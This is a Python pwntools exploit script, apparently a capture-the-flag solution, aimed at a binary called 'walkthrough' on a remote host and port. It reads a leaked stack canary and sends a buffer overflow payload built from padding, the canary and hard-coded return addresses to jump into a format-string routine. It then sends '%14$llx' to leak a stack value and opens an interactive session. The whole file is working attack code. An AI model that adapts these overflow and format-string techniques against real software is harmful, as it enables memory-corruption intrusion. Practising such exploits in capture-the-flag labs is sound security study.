#!/usr/bin/env python3

from pwn import *

exe = ELF("./walkthrough")

context.binary = exe


def conn():
	if False:
		return process([exe.path])
	else:
		return remote("147.182.172.217", 42001)


def main():
	r = conn()

	# Step one: b0f to fmtstr()
	r.recvuntil("stack.")
	r.recvline()
	r.recvline()
	canary = p64(int(r.recvline()[-19:-1].decode('utf-8'), 16))
	padding = bytes("A" * 72, 'utf-8')
	extra_padding = bytes("A" * 8, 'utf-8')
	fmtstr = p64(0x00000000004018dc)
	ret = p64(0x0000000000401016)
	payload1 = padding + canary + extra_padding + ret + fmtstr
	r.recvuntil("stack.")
	r.sendline(payload1)

	# Step 2: fmtstr to get num[3] = num[4]
	r.recvuntil("printf.")
	r.sendline("%14$llx")
	r.recvline()
	r.recvline()
	r.recvline()
	leak = int(r.recvline().decode('utf-8'), 16)
	r.recvuntil("guessing.")
	r.sendline(str(leak))
	r.interactive()


if __name__ == "__main__":
	main()
